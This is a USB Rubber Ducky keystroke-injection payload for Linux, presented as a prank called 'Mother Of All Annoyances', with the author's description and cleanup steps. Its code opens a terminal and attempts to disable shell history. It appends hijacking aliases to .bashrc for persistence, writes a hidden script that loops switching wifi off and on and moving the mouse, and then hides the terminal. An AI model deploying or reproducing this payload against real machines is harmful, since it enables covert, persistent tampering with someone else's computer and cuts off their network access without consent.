REM TITLE: MOAA (Mother Of All Annoyances)
REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
REM TARGET OS: Linux (tested on Pop!_OS) | Dependencies: `xdotool` (for mouse movement) and `gnome environment` (for terminal window spawning).
REM DESCRIPTION: The Mother Of All Annoyances payload. This will randomly loop CAPSLOCK and NUMLOCK on/off and create arrowkey movement (all three controlled via the ducky).
MOAA also writes a Bash script (.MOAA.sh) hidden in the users' home directory that will loop turning on/off the Wifi radio and will teleport the mouse pointer around the screen.
The Bash script is triggered via persistent (appending .bashrc) alias binds. Script execution is bound to the `ls` command. The payload also binds the `exit` command to spawn new terminal windows (gnome environment) so you can never "exit". Lastly, the `pwd` command will print "command not found" to the users' terminal instead of printing the working directory.

REM HOW DO I STOP THIS MADNESS: You don't, RIP. Kidding, unplug your ducky > in a terminal window: `ps aux | grep -i MOAA.sh' > kill the associated process > close your terminal via mouse.
REM CLEANUP: Remove the MOAA.sh script on the machine: `rm -f ~/.MOAA.sh`, Remove alias key binds in `.bashrc` file: `nano ~/.bashrc' (scroll to the bottom of the file and remove alias binds).

ATTACKMODE HID
DELAY 1000
CTRL ALT t
DELAY 300

REM Unsetting HISTFILE and adding aliases to shell environment:
STRINGLN unset HISTILE
STRINGLN cd ~ && cat >> .bashrc
STRINGLN alias ls="(~/./.MOAA.sh > /dev/null 2>&1 &)"
STRINGLN alias exit="(gnome-terminal)"
STRINGLN alias pwd="echo 'command not found'"
CTRL c

REM Creating MOAA.sh Bash script to control wifi toggling and mouse movement:
STRINGLN_BASH
cat > .MOAA.sh
#!/bin/bash
while true
do
nmcli r wifi off
xdotool mousemove 300 0
sleep 2
xdotool mousemove 2000 200
sleep 2
nmcli r wifi on
xdotool mousemove 25 100
sleep 2
xdotool mousemove 1000 1000
sleep 2
done
END_STRINGLN
CTRL c

REM Giving execution perms to MOAA.sh:
STRINGLN chmod +x ~/.MOAA.sh

REM Closing terminal window:
ALT SPACE
UP
HOLD DOWN
DELAY 350
ENTER

REM Beginning loop to toggle capslock, numlock, and move arrow keys up and down:
WHILE TRUE
CAPSLOCK
DELAY 1000
NUMLOCK
DELAY 1000
REPEAT 2 UP
DELAY 1000
REPEAT 2 DOWN
DELAY 1000
CAPSLOCK
DELAY 1000
NUMLOCK
DELAY 1000
END_WHILE
